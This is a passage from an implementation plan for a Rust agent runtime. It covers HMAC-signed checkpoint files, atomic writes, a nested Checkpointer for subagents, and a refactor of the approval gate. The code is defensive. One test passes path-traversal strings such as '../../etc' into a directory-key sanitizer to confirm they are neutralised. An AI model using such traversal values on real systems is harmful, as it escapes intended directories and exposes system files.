fn sha256_hex(data: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    hex(&Sha256::digest(data))
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

/// Constant-order compare is unnecessary here (local files, not a network
/// oracle), but keep it cheap and obvious.
fn mac_eq(a: &str, b: &str) -> bool {
    a.len() == b.len() && a.bytes().zip(b.bytes()).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}

#[derive(serde::Serialize, serde::Deserialize)]
struct Manifest {
    version: u32,
    files: BTreeMap<String, String>,
    hmac: String,
}

#[derive(serde::Serialize, serde::Deserialize)]
struct Answer {
    approve: bool,
    mac: String,
}
```

Atomic I/O helpers — same shape as 4B-0's `session_meta.rs` (agent-core
cannot depend on agent-runtime-config; the ~30-line duplication is accepted
and noted here):

```rust
fn create_dir_0700(dir: &Path) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        match std::fs::DirBuilder::new().recursive(true).mode(0o700).create(dir) {
            Ok(()) => return Ok(()),
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => return Ok(()),
            Err(e) => return Err(e),
        }
    }
    #[cfg(not(unix))]
    std::fs::create_dir_all(dir)
}

/// Temp name appends the FULL filename (4A-1 collision gotcha); temp created
/// 0o600 so the rename never widens modes.
fn atomic_write_0600(path: &Path, bytes: &[u8]) -> std::io::Result<()> {
    use std::io::Write;
    let file_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "no filename"))?;
    let tmp = path.with_file_name(format!("{file_name}.tmp"));
    let mut opts = std::fs::OpenOptions::new();
    opts.create(true).truncate(true).write(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let mut f = opts.open(&tmp)?;
    f.write_all(bytes)?;
    f.sync_all()?;
    drop(f);
    std::fs::rename(&tmp, path)
}
```

Core functions:

```rust
pub fn write_checkpoint(
    dir: &Path,
    key: &[u8; 32],
    chk: &Checkpoint,
    artifacts: &BTreeMap<String, BTreeMap<String, String>>,
) -> std::io::Result<()> {
    create_dir_0700(dir)?;
    create_dir_0700(&dir.join("artifacts"))?;
    let io_err = |e: serde_json::Error| std::io::Error::new(std::io::ErrorKind::InvalidData, e);
    let parked = serde_json::to_vec_pretty(chk).map_err(io_err)?;
    let mut files = BTreeMap::new();
    files.insert("parked.json".to_string(), sha256_hex(&parked));
    let mut writes: Vec<(PathBuf, Vec<u8>)> = vec![(dir.join("parked.json"), parked)];
    for (store, tree) in artifacts {
        let body = serde_json::to_vec_pretty(tree).map_err(io_err)?;
        files.insert(format!("artifacts/{store}.json"), sha256_hex(&body));
        writes.push((dir.join("artifacts").join(format!("{store}.json")), body));
    }
    let mac = hex(&hmac_sha256(key, &serde_json::to_vec(&files).map_err(io_err)?));
    let manifest = serde_json::to_vec_pretty(&Manifest {
        version: CHECKPOINT_VERSION,
        files,
        hmac: mac,
    })
    .map_err(io_err)?;
    for (path, bytes) in writes {
        atomic_write_0600(&path, &bytes)?;
    }
    // Manifest LAST: its presence marks a complete tree (a crash mid-write
    // leaves no manifest ⇒ load refuses as corrupt ⇒ spec §4 torn-tree row).
    atomic_write_0600(&dir.join("manifest.json"), &manifest)
}

pub fn has_park(dir: &Path) -> bool {
    dir.join("parked.json").exists()
}

fn verified_manifest(dir: &Path, key: &[u8; 32]) -> Result<Manifest, CheckpointError> {
    let bytes = std::fs::read(dir.join("manifest.json"))
        .map_err(|e| CheckpointError::Corrupt(format!("manifest unreadable: {e}")))?;
    let m: Manifest = serde_json::from_slice(&bytes)
        .map_err(|e| CheckpointError::Corrupt(format!("manifest parse: {e}")))?;
    let expect = hex(&hmac_sha256(
        key,
        &serde_json::to_vec(&m.files)
            .map_err(|e| CheckpointError::Corrupt(e.to_string()))?,
    ));
    if !mac_eq(&expect, &m.hmac) {
        return Err(CheckpointError::Corrupt("HMAC mismatch".into()));
    }
    for (rel, want) in &m.files {
        let body = std::fs::read(dir.join(rel))
            .map_err(|e| CheckpointError::Corrupt(format!("{rel} unreadable: {e}")))?;
        if !mac_eq(&sha256_hex(&body), want) {
            return Err(CheckpointError::Corrupt(format!("{rel} hash mismatch")));
        }
    }
    Ok(m)
}

pub fn load_checkpoint(dir: &Path, key: &[u8; 32]) -> Result<Option<Checkpoint>, CheckpointError> {
    if !has_park(dir) {
        return Ok(None);
    }
    verified_manifest(dir, key)?;
    let bytes = std::fs::read(dir.join("parked.json"))?;
    // Version gate BEFORE full decode: future shapes may not deserialize.
    let head: serde_json::Value = serde_json::from_slice(&bytes)
        .map_err(|e| CheckpointError::Corrupt(format!("parked.json parse: {e}")))?;
    let found = head.get("version").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    if found != CHECKPOINT_VERSION {
        return Err(CheckpointError::Version { found });
    }
    serde_json::from_value(head)
        .map(Some)
        .map_err(|e| CheckpointError::Corrupt(format!("parked.json decode: {e}")))
}

pub fn load_artifact_dump(
    dir: &Path,
    key: &[u8; 32],
) -> Result<BTreeMap<String, BTreeMap<String, String>>, CheckpointError> {
    let m = verified_manifest(dir, key)?;
    let mut out = BTreeMap::new();
    for rel in m.files.keys() {
        if let Some(store) = rel
            .strip_prefix("artifacts/")
            .and_then(|s| s.strip_suffix(".json"))
        {
            let bytes = std::fs::read(dir.join(rel))?;
            let tree: BTreeMap<String, String> = serde_json::from_slice(&bytes)
                .map_err(|e| CheckpointError::Corrupt(format!("{rel}: {e}")))?;
            out.insert(store.to_string(), tree);
        }
    }
    Ok(out)
}

/// Delete this level's park (answer commit / turn completion). Children are
/// untouched — a still-parked child outlives its parent's answer.
pub fn clear_park(dir: &Path) {
    let _ = std::fs::remove_file(dir.join("parked.json"));
    let _ = std::fs::remove_file(dir.join("manifest.json"));
    let _ = std::fs::remove_dir_all(dir.join("artifacts"));
    let _ = std::fs::remove_file(dir.join("answer.json"));
}

fn answer_mac(key: &[u8; 32], approve: bool, manifest_hmac: &str) -> String {
    let mut data = vec![approve as u8];
    data.extend_from_slice(manifest_hmac.as_bytes());
    hex(&hmac_sha256(key, &data))
}

/// Restart-path answer commit (header note 3): durable, MAC-bound to the
/// exact park it answers. The resumed loop consumes it via `take_answer`.
pub fn write_answer(dir: &Path, key: &[u8; 32], approve: bool) -> std::io::Result<()> {
    let m = verified_manifest(dir, key)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e.to_string()))?;
    let a = Answer { approve, mac: answer_mac(key, approve, &m.hmac) };
    atomic_write_0600(
        &dir.join("answer.json"),
        &serde_json::to_vec(&a).expect("answer serializes"),
    )
}

/// Verify + consume the answer. Any verification failure ⇒ None (the ask is
/// re-prompted — fail closed, never fail open).
pub fn take_answer(dir: &Path, key: &[u8; 32]) -> Option<bool> {
    let bytes = std::fs::read(dir.join("answer.json")).ok()?;
    let _ = std::fs::remove_file(dir.join("answer.json"));
    let a: Answer = serde_json::from_slice(&bytes).ok()?;
    let m = verified_manifest(dir, key).ok()?;
    mac_eq(&a.mac, &answer_mac(key, a.approve, &m.hmac)).then_some(a.approve)
}
```

Note the test in Step 1 calls `load_artifact_dump(dir)` with one arg — the
implemented signature takes `(dir, key)`; write the tests against the
two-arg form (`load_artifact_dump(dir.path(), &key())`).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-core checkpoint`
Expected: all Task-4 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-core/src/checkpoint.rs agent/crates/agent-core/src/lib.rs agent/crates/agent-core/Cargo.toml
git commit -m "feat(core): versioned checkpoint format + HMAC manifest + answer commit (4B-1, E6b)"
```

---

### Task 5: `Checkpointer` runtime handle + Backend-level artifacts dump/restore

**Files:**
- Modify: `agent/crates/agent-core/src/checkpoint.rs`,
  `agent/crates/agent-core/src/middleware.rs` (`ModelCallCount` →
  `pub(crate)`), `agent/crates/agent-core/src/loop_.rs`
  (`with_checkpointer` builder + field)
- Test: inline tests in `checkpoint.rs`

**Interfaces:**
- Consumes: Task 4 free functions, `agent_tools::backend::Backend`,
  `crate::SessionArtifacts` (fields `results`, `history`, both
  `Arc<dyn Backend>` — `pub(crate)` visibility verified: dispatch.rs already
  reads `artifacts.results` in-crate).
- Produces (Tasks 6–8, 10–11 rely on):

```rust
/// Everything a loop needs to park and everything dispatch needs to derive
/// child checkpointers. Cheap to clone behind Arc.
pub struct Checkpointer {
    dir: PathBuf,
    key: [u8; 32],
    session_id: String,
    subagent_path: Vec<String>,
    origin: Option<agent_policy::ApprovalOrigin>,
    parent: Option<Arc<Checkpointer>>,
    /// Pre-Phase-2 snapshot for dispatch-bearing turns; memory-only unless a
    /// descendant parks (E1). Cleared at turn end.
    turn_snapshot: Mutex<Option<PendingSnapshot>>,
    /// True once this level flushed a dispatch-kind park this turn.
    flushed: AtomicBool,
    /// Asks currently blocked at a gate in THIS loop or any descendant
    /// (owner decision P2): incremented on self + every ancestor when a
    /// durable Ask starts waiting, decremented when it resolves. Dispatch
    /// disarms its deadline while a child's count is non-zero.
    waiting_asks: AtomicUsize,
}

/// A dispatch-kind checkpoint waiting in memory (flushed only if a
/// descendant parks).
pub struct PendingSnapshot {
    pub context: crate::CuratedContextState,
    pub guardrails: Guardrails,
    pub turn: u64,
    pub assistant_text: String,
    pub tool_calls: Vec<agent_tools::ToolCall>,
    pub invalid: Vec<InvalidParked>,
    pub gate_records: Vec<GateRecord>,
    pub artifacts: Arc<crate::SessionArtifacts>,
}

impl Checkpointer {
    pub fn new(dir: PathBuf, key: [u8; 32], session_id: String) -> Arc<Self>;
    /// Child checkpointer for one dispatch call (header note 1: keyed by the
    /// parent's call id, which IS restart-stable).
    pub fn child(self: &Arc<Self>, call_id: &str, origin: agent_policy::ApprovalOrigin) -> Arc<Checkpointer>;
    pub fn dir(&self) -> &Path;
    pub fn origin(&self) -> Option<&agent_policy::ApprovalOrigin>;
    pub fn set_turn_snapshot(&self, snap: PendingSnapshot);
    /// Turn completed: drop the memory snapshot; if it was flushed to disk
    /// this turn (a descendant parked), remove the dispatch-kind park.
    pub fn end_turn(&self);
    /// Gate-kind park write (spec §2.3): dumps artifacts, writes checkpoint,
    /// then flushes every ancestor's pending snapshot (dispatch-kind).
    pub async fn write_park(&self, chk: Checkpoint, artifacts: &crate::SessionArtifacts) -> std::io::Result<()>;
    /// Answer commit on the live path: delete this level's park.
    pub fn clear_park(&self);
    /// P2 deadline disarm: RAII guard bumping waiting_asks on self + every
    /// ancestor for the duration of a blocked gate Ask.
    pub fn enter_ask(self: &Arc<Self>) -> AskGuard;
    pub fn is_awaiting_ask(&self) -> bool;   // waiting_asks > 0
    pub fn take_answer(&self) -> Option<bool>;
    /// Load + verify a child's checkpoint (dispatch resume rebinding).
    pub fn load_child(&self, call_id: &str) -> Result<Option<Checkpoint>, CheckpointError>;
    pub fn child_artifact_dump(&self, call_id: &str) -> Result<BTreeMap<String, BTreeMap<String, String>>, CheckpointError>;
    /// Remove a child's entire checkpoint dir (child finished).
    pub fn clear_child(&self, call_id: &str);
}

/// Dump both artifact stores through the Backend trait (recursive ls+read —
/// NEVER glob, which caps at 500; spec §2.3).
pub async fn dump_artifacts(a: &crate::SessionArtifacts) -> BTreeMap<String, BTreeMap<String, String>>;
/// Restore a dump into fresh backends (spec §2.4 step 3).
pub async fn restore_artifacts(a: &crate::SessionArtifacts, dump: &BTreeMap<String, BTreeMap<String, String>>);

pub fn sanitize_dir_key(call_id: &str) -> String;  // [A-Za-z0-9._-] else '-'
```

- `middleware.rs`: `struct ModelCallCount(usize)` becomes
  `pub(crate) struct ModelCallCount(pub(crate) usize);` (spec §2.2 — the
  loop reads/seeds it in-crate; trait unchanged).
- `loop_.rs`: `AgentLoop` gains field
  `checkpointer: Option<Arc<crate::Checkpointer>>` (default `None` in
  `new`) and builder
  `pub fn with_checkpointer(mut self, ck: Arc<crate::Checkpointer>) -> Self`.

- [ ] **Step 1: Write the failing tests**

In `checkpoint.rs` tests:

```rust
    #[tokio::test]
    async fn dump_and_restore_artifacts_round_trip_via_backend_trait() {
        let a = crate::SessionArtifacts::new();
        a.results.write("r/deep/one.md", "alpha").await.unwrap();
        a.results.write("two.md", "beta").await.unwrap();
        a.history.write("history.md", "## s1\nhi").await.unwrap();
        let dump = dump_artifacts(&a).await;
        assert_eq!(dump["results"]["r/deep/one.md"], "alpha");
        assert_eq!(dump["results"]["two.md"], "beta");
        assert_eq!(dump["history"]["history.md"], "## s1\nhi");
        let b = crate::SessionArtifacts::new();
        restore_artifacts(&b, &dump).await;
        assert_eq!(b.results.read("r/deep/one.md").await.unwrap(), "alpha");
        assert_eq!(b.history.read("history.md").await.unwrap(), "## s1\nhi");
    }

    #[tokio::test]
    async fn child_park_flushes_ancestor_snapshot_and_end_turn_clears_it() {
        let dir = tempfile::tempdir().unwrap();
        let root = Checkpointer::new(dir.path().join("checkpoint"), key(), "s1".into());
        let arts = Arc::new(crate::SessionArtifacts::new());
        root.set_turn_snapshot(PendingSnapshot {
            context: sample().context,
            guardrails: Guardrails { tool_calls: 1, model_calls: 1 },
            turn: 0,
            assistant_text: "dispatching".into(),
            tool_calls: sample().parked.tool_calls,
            invalid: vec![],
            gate_records: vec![GateRecord::Ready],
            artifacts: arts.clone(),
        });
        // E1: snapshot alone writes NOTHING
        assert!(!root.dir().exists());

        let child = root.child("call_1", agent_policy::ApprovalOrigin {
            delegation_id: "call_1".into(),
            subagent_name: "general-purpose".into(),
            depth: 1,
        });
        let mut chk = sample();
        chk.subagent_path = vec!["call_1".into()];
        child.write_park(chk, &crate::SessionArtifacts::new()).await.unwrap();

        // child park present under children/<call_id>; ancestor flushed
        assert!(has_park(&root.dir().join("children").join("call_1")));
        assert!(has_park(root.dir()), "ancestor dispatch-kind park flushed");
        let parent = load_checkpoint(root.dir(), &key()).unwrap().unwrap();
        assert_eq!(parent.parked.parked_index, None, "dispatch-kind");
        assert_eq!(load_checkpoint(&root.dir().join("children/call_1"), &key())
            .unwrap().unwrap().subagent_path, vec!["call_1".to_string()]);

        // parent turn completes → its dispatch-kind park is removed,
        // child park untouched
        root.end_turn();
        assert!(!has_park(root.dir()));
        assert!(has_park(&root.dir().join("children").join("call_1")));
        // second end_turn is a no-op
        root.end_turn();
    }

    #[tokio::test]
    async fn grandchild_checkpointers_nest_recursively() {
        // E6a: grandchild composition covered at unit level.
        let dir = tempfile::tempdir().unwrap();
        let root = Checkpointer::new(dir.path().join("checkpoint"), key(), "s1".into());
        let child = root.child("call_a", agent_policy::ApprovalOrigin {
            delegation_id: "call_a".into(), subagent_name: "x".into(), depth: 1 });
        let grand = child.child("call_b", agent_policy::ApprovalOrigin {
            delegation_id: "sub1:call_b".into(), subagent_name: "y".into(), depth: 2 });
        assert_eq!(grand.subagent_path(), ["call_a".to_string(), "call_b".to_string()]);
        // give BOTH ancestors a pending turn snapshot (as the loop would on
        // a dispatch-bearing turn) so the flush cascade is assertable
        let snap = || PendingSnapshot {
            context: sample().context,
            guardrails: Guardrails::default(),
            turn: 0,
            assistant_text: String::new(),
            tool_calls: vec![],
            invalid: vec![],
            gate_records: vec![],
            artifacts: Arc::new(crate::SessionArtifacts::new()),
        };
        root.set_turn_snapshot(snap());
        child.set_turn_snapshot(snap());
        let mut chk = sample();
        chk.subagent_path = grand.subagent_path().to_vec();
        grand.write_park(chk, &crate::SessionArtifacts::new()).await.unwrap();
        // grandchild park lands two levels down; BOTH ancestors flushed
        assert!(has_park(&root.dir().join("children/call_a/children/call_b")));
        assert!(has_park(&root.dir().join("children").join("call_a")));
        assert!(has_park(root.dir()));
    }

    #[test]
    fn sanitize_dir_key_neutralizes_separators_and_dot_prefixes() {
        assert_eq!(sanitize_dir_key("call_1"), "call_1");
        assert!(!sanitize_dir_key("a/b").contains('/'));
        assert!(!sanitize_dir_key("..\\..").contains('\\'));
        assert!(!sanitize_dir_key("../../etc").starts_with('.'));
        assert_eq!(sanitize_dir_key(""), "call");
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-core checkpoint`
Expected: COMPILE ERROR — `Checkpointer` etc. not found.

- [ ] **Step 3: Implement**

`dump_artifacts` / `restore_artifacts` (Backend-trait-level; recursive `ls`):

```rust
async fn dump_backend(b: &Arc<dyn agent_tools::backend::Backend>) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    let mut stack = vec![String::new()]; // "" = root
    while let Some(dir) = stack.pop() {
        let Ok(entries) = b.ls(&dir).await else { continue };
        for e in entries {
            let path = if dir.is_empty() { e.name.clone() } else { format!("{dir}/{}", e.name) };
            if e.is_dir {
                stack.push(path);
            } else if let Ok(content) = b.read(&path).await {
                out.insert(path, content);
            }
        }
    }
    out
}

pub async fn dump_artifacts(a: &crate::SessionArtifacts) -> BTreeMap<String, BTreeMap<String, String>> {
    BTreeMap::from([
        ("results".to_string(), dump_backend(&a.results).await),
        ("history".to_string(), dump_backend(&a.history).await),
    ])
}

pub async fn restore_artifacts(
    a: &crate::SessionArtifacts,
    dump: &BTreeMap<String, BTreeMap<String, String>>,
) {
    for (store, backend) in [("results", &a.results), ("history", &a.history)] {
        if let Some(tree) = dump.get(store) {
            for (path, content) in tree {
                let _ = backend.write(path, content).await;
            }
        }
    }
}
```

(Verify at source how `MemBackend::ls("")` lists the root and whether
directories appear as `is_dir` entries — the conformance suite in
`agent-tools/src/backend/` pins the semantics; adapt the root key ("" vs
"/") to what `ls` actually accepts. The unit test above is the arbiter.)

```rust
pub fn sanitize_dir_key(call_id: &str) -> String {
    let out: String = call_id
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() || "._-".contains(c) { c } else { '-' })
        .collect();
    // ".." would escape the tree even without '/' once joined recursively;
    // a leading dot also hides the dir. Neutralize both.
    let out = out.trim_start_matches('.').to_string();
    if out.is_empty() { "call".to_string() } else { out }
}
```

`Checkpointer`:

```rust
impl Checkpointer {
    pub fn new(dir: PathBuf, key: [u8; 32], session_id: String) -> Arc<Self> {
        Arc::new(Self {
            dir,
            key,
            session_id,
            subagent_path: Vec::new(),
            origin: None,
            parent: None,
            turn_snapshot: Mutex::new(None),
            flushed: AtomicBool::new(false),
            waiting_asks: AtomicUsize::new(0),
        })
    }

    pub fn child(
        self: &Arc<Self>,
        call_id: &str,
        origin: agent_policy::ApprovalOrigin,
    ) -> Arc<Checkpointer> {
        let key_name = sanitize_dir_key(call_id);
        let mut path = self.subagent_path.clone();
        path.push(key_name.clone());
        Arc::new(Self {
            dir: self.dir.join("children").join(key_name),
            key: self.key,
            session_id: self.session_id.clone(),
            subagent_path: path,
            origin: Some(origin),
            parent: Some(self.clone()),
            turn_snapshot: Mutex::new(None),
            flushed: AtomicBool::new(false),
            waiting_asks: AtomicUsize::new(0),
        })
    }

    pub fn dir(&self) -> &Path { &self.dir }
    pub fn key(&self) -> &[u8; 32] { &self.key }
    pub fn session_id(&self) -> &str { &self.session_id }
    pub fn subagent_path(&self) -> &[String] { &self.subagent_path }
    pub fn origin(&self) -> Option<&agent_policy::ApprovalOrigin> { self.origin.as_ref() }

    pub fn set_turn_snapshot(&self, snap: PendingSnapshot) {
        *self.turn_snapshot.lock().unwrap() = Some(snap);
    }

    pub fn end_turn(&self) {
        *self.turn_snapshot.lock().unwrap() = None;
        if self.flushed.swap(false, Ordering::SeqCst) {
            clear_park(&self.dir);
        }
    }

    /// Gate-kind park (spec §2.3): write THIS loop's checkpoint, then flush
    /// ancestors so a restarted daemon can rebuild the whole tree.
    pub async fn write_park(
        &self,
        chk: Checkpoint,
        artifacts: &crate::SessionArtifacts,
    ) -> std::io::Result<()> {
        let dump = dump_artifacts(artifacts).await;
        write_checkpoint(&self.dir, &self.key, &chk, &dump)?;
        self.flushed.store(true, Ordering::SeqCst);
        let mut anc = self.parent.clone();
        while let Some(a) = anc {
            a.flush_snapshot().await;
            anc = a.parent.clone();
        }
        Ok(())
    }

    /// Flush the pending dispatch-kind snapshot, once per turn.
    async fn flush_snapshot(&self) {
        if self.flushed.load(Ordering::SeqCst) {
            return; // already on disk this turn (gate park or earlier child)
        }
        let snap = self.turn_snapshot.lock().unwrap().take();
        let Some(snap) = snap else { return };
        let chk = Checkpoint {
            version: CHECKPOINT_VERSION,
            session_id: self.session_id.clone(),
            subagent_path: self.subagent_path.clone(),
            turn: snap.turn,
            context: snap.context,
            guardrails: snap.guardrails,
            parked: ParkedTurn {
                assistant_text: snap.assistant_text,
                tool_calls: snap.tool_calls,
                invalid: snap.invalid,
                gate_records: snap.gate_records,
                parked_index: None, // dispatch-kind
                origin: self.origin.clone(),
            },
        };
        let dump = dump_artifacts(&snap.artifacts).await;
        if let Err(e) = write_checkpoint(&self.dir, &self.key, &chk, &dump) {
            tracing::warn!(target: "checkpoint", error = %e,
                "ancestor snapshot flush failed; restart resume may be partial");
            return;
        }
        self.flushed.store(true, Ordering::SeqCst);
    }

    pub fn clear_park(&self) {
        clear_park(&self.dir);
        self.flushed.store(false, Ordering::SeqCst);
    }

    /// P2: mark an Ask as blocked here — the count propagates up so every
    /// enclosing dispatch call disarms its deadline while we wait. RAII so
    /// a cancelled/denied/dropped await always unwinds the count.
    pub fn enter_ask(self: &Arc<Self>) -> AskGuard {
        let mut node = Some(self.clone());
        let mut bumped = Vec::new();
        while let Some(n) = node {
            n.waiting_asks.fetch_add(1, Ordering::SeqCst);
            node = n.parent.clone();
            bumped.push(n);
        }
        AskGuard(bumped)
    }

    pub fn is_awaiting_ask(&self) -> bool {
        self.waiting_asks.load(Ordering::SeqCst) > 0
    }
```

```rust
/// Decrements every bumped node on drop (P2 unwind safety).
pub struct AskGuard(Vec<Arc<Checkpointer>>);
impl Drop for AskGuard {
    fn drop(&mut self) {
        for n in &self.0 {
            n.waiting_asks.fetch_sub(1, Ordering::SeqCst);
        }
    }
}
```

(Careful with the `while let` above — `node = n.parent.clone()` must run
BEFORE `bumped.push(n)` moves `n`, as written. Add a unit test: a
grandchild's `enter_ask` makes `is_awaiting_ask()` true at all three
levels; dropping the guard returns all three to false; two concurrent
guards at different levels count independently.)

Remaining `impl Checkpointer` methods (same block):

```rust
    pub fn take_answer(&self) -> Option<bool> {
        take_answer(&self.dir, &self.key)
    }

    pub fn load_child(&self, call_id: &str) -> Result<Option<Checkpoint>, CheckpointError> {
        load_checkpoint(&self.dir.join("children").join(sanitize_dir_key(call_id)), &self.key)
    }

    pub fn child_artifact_dump(
        &self,
        call_id: &str,
    ) -> Result<BTreeMap<String, BTreeMap<String, String>>, CheckpointError> {
        load_artifact_dump(&self.dir.join("children").join(sanitize_dir_key(call_id)), &self.key)
    }

    pub fn clear_child(&self, call_id: &str) {
        let _ = std::fs::remove_dir_all(self.dir.join("children").join(sanitize_dir_key(call_id)));
    }
}
```

Note the flush-inside-lock hazard: `flush_snapshot` takes the snapshot OUT
of the mutex before any `.await` (a `MutexGuard` must not cross an await —
same discipline as `RunShared::with`). The code above already does this
(`let snap = ...take();` drops the guard at the semicolon — keep that shape,
do not inline the lock into the await expression).

In `middleware.rs`, change (locate by content `struct ModelCallCount(usize);`):

```rust
#[derive(Default)]
pub(crate) struct ModelCallCount(pub(crate) usize);
```

In `loop_.rs`, add the field to `AgentLoop` (after `backend`):

```rust
    /// Park-point checkpointer (spec 4B-1). None (default) ⇒ the loop is
    /// byte-identical to pre-checkpoint behavior: zero checkpoint I/O (E1).
    checkpointer: Option<Arc<crate::Checkpointer>>,
```

`checkpointer: None` in `AgentLoop::new`'s `Self { ... }`, plus (next to
`with_backend`):

```rust
    pub fn with_checkpointer(mut self, ck: Arc<crate::Checkpointer>) -> Self {
        self.checkpointer = Some(ck);
        self
    }
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-core checkpoint && cargo build -p agent-core`
Expected: PASS / clean build.

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-core/src/checkpoint.rs agent/crates/agent-core/src/middleware.rs agent/crates/agent-core/src/loop_.rs agent/crates/agent-core/src/lib.rs
git commit -m "feat(core): Checkpointer handle + Backend-level artifact dump/restore (4B-1)"
```

---

### Task 6: Loop refactor — extract `tool_phase`/`turn_loop`, split `gate_tool` (behavior-preserving)

This task changes NO behavior — it reshapes `run_with_cancel` so Task 7 can
park at the gate and Task 8 can re-enter a turn. The existing agent-core
suite is the acceptance test.

**Files:**
- Modify: `agent/crates/agent-core/src/loop_.rs`
- Test: existing agent-core suite (must pass unmodified)

**Interfaces:**
- Produces (Tasks 7–8 rely on these exact shapes):

```rust
/// One gated-but-unanswered call: everything needed to prompt + proceed.
struct PendingAsk {
    tool: Arc<dyn Tool>,
    call: ToolCall,
    req: ApprovalRequest,          // intent(+posture), display: None, origin: None
    access: agent_tools::Access,
}

enum GateOutcome {
    Ready(ReadyCall),
    Rejected { id: String, name: String, content: String },
    /// Policy said Ask; the CALLER prompts (and, Task 7, parks) — gate_tool
    /// no longer awaits the channel itself.
    NeedsApproval(Box<PendingAsk>),
}

impl AgentLoop {
    /// ToolCtx + ReadyCall construction (tail of today's gate_tool).
    fn ready_call(&self, tool: Arc<dyn Tool>, call: ToolCall,
        access: agent_tools::Access, cancel: &CancellationToken) -> ReadyCall;

    /// Phase 1 (gate) + Phase 2 (execute) + Phase 3 (drain) + validators +
    /// after_tools/on_turn_end hooks — today's lines from
    /// "// Phase 1 — gate every call sequentially" through the
    /// fire_turn_end block, moved verbatim.
    async fn tool_phase(
        &self,
        ctx: &mut dyn ContextManager,
        mw_state: &mut crate::RunState,
        run_shared: &crate::RunShared,
        cancel: &CancellationToken,
        turn: usize,
        assistant_text: String,               // the turn's model text (park record)
        tool_calls: Vec<ToolCall>,
        invalid: Vec<crate::InvalidParked>,   // (id, name, error) triples
        pre: Option<PreDecided>,              // Task 8; None in this task
    ) -> TurnFlow;

    /// The `for turn in start..max_turns` loop + budget wrap-up epilogue —
    /// today's body moved verbatim; `run_with_cancel` becomes prologue +
    /// `self.turn_loop(ctx, &mut mw_state, &run_shared, cancel, 0, preserve_thinking)`.
    async fn turn_loop(
        &self,
        ctx: &mut dyn ContextManager,
        mw_state: &mut crate::RunState,
        run_shared: &crate::RunShared,
        cancel: CancellationToken,
        start_turn: usize,
        preserve_thinking: bool,
    ) -> Result<(), AgentError>;
}

enum TurnFlow {
    /// Turn completed; continue with the next turn.
    Continue,
    /// The run ended inside the phase (Done already emitted) or errored.
    End(Result<(), AgentError>),
}

/// Pre-decided gate outcomes for a resumed batch (Task 8 fills it in).
struct PreDecided {
    records: Vec<crate::GateRecord>,
    parked_index: usize,
    /// Some(_) when answer.json committed a decision; None ⇒ re-ask live.
    parked_decision: Option<bool>,
    /// Dispatch-kind resume (owner decision P1): Ready records re-execute
    /// ONLY dispatch_agent calls; other siblings get a synthetic
    /// lost-result error so host side effects never replay.
    dispatch_kind: bool,
}
```

- [ ] **Step 1: Split `gate_tool`**

In `gate_tool` (locate by content "Sequential by design so approval prompts
never overlap"), replace the `Decision::Ask` arm's `tokio::select!` await:
today's arm builds `req` then awaits `self.approval.request(req)`. Change it
to return instead (the posture-string construction and
`ApprovalRequest { intent, display: None, origin: None }` stay verbatim):

```rust
            Decision::Ask => {
                // ...posture construction unchanged...
                let req = ApprovalRequest {
                    intent,
                    display: None,
                    origin: None,
                };
                return GateOutcome::NeedsApproval(Box::new(PendingAsk {
                    tool,
                    call,
                    req,
                    access,
                }));
            }
```

Delete the now-dead `let allowed = match ...` / `if !allowed` scaffolding for
the Ask case (Allow stays `true`-through, Deny stays an early return), and
move the trailing `ToolCtx`/`ReadyCall` construction into the new helper:

```rust
    fn ready_call(
        &self,
        tool: Arc<dyn Tool>,
        call: ToolCall,
        access: agent_tools::Access,
        cancel: &CancellationToken,
    ) -> ReadyCall {
        let ctx = ToolCtx {
            workspace: self.config.workspace.clone(),
            timeout: tool.timeout_override().unwrap_or(self.config.tool_timeout),
            cancel: cancel.clone(),
            sandbox: self.config.sandbox.clone(),
            backend: self.backend.clone(),
            call_id: call.id.clone(),
        };
        ReadyCall { tool, args: call.args, id: call.id, name: call.name, ctx, access }
    }
```

`gate_tool`'s Allow path ends with `GateOutcome::Ready(self.ready_call(tool, call, access, cancel))`.
Also note: `AgentEvent::Approval(req.clone())` emission and the
cancel-race MOVE OUT of gate_tool into the Phase-1 loop (next step) —
gate_tool no longer touches the channel at all. Keep the ToolStart emit and
the cancel short-circuit at gate entry exactly where they are.

- [ ] **Step 2: Handle `NeedsApproval` in the Phase-1 loop**

Replace the Phase-1 `for call in parsed.tool_calls { match self.gate_tool(...) }`
match with three arms; the new arm reproduces today's semantics exactly
(emit, race cancel vs. request, deny reasons):

```rust
                    GateOutcome::NeedsApproval(pa) => {
                        let PendingAsk { tool, call, req, access } = *pa;
                        self.sink.emit(AgentEvent::Approval(req.clone()));
                        // P2 deadline disarm: while this durable Ask waits,
                        // every enclosing dispatch deadline is suspended.
                        // RAII — deny/cancel/drop all unwind the count.
                        let _ask_guard = self.checkpointer.as_ref().map(|ck| ck.enter_ask());
                        let allowed = tokio::select! {
                            _ = cancel.cancelled() => false,
                            resp = self.approval.request(req) => matches!(
                                resp,
                                ApprovalResponse::Approve | ApprovalResponse::ApproveAlways
                            ),
                        };
                        if allowed {
                            let rc = self.ready_call(tool, call, access, &cancel);
                            order.push(rc.id.clone());
                            ready.push(rc);
                        } else {
                            let reason = if cancel.is_cancelled() {
                                "run cancelled"
                            } else {
                                "user declined"
                            };
                            order.push(call.id.clone());
                            results.insert(
                                call.id,
                                (
                                    call.name,
                                    Resolved::Err {
                                        status: ToolStatus::Denied,
                                        content: format!(
                                            "ERROR: {}",
                                            ToolError::Denied(reason.into())
                                        ),
                                        duration_ms: 0,
                                    },
                                ),
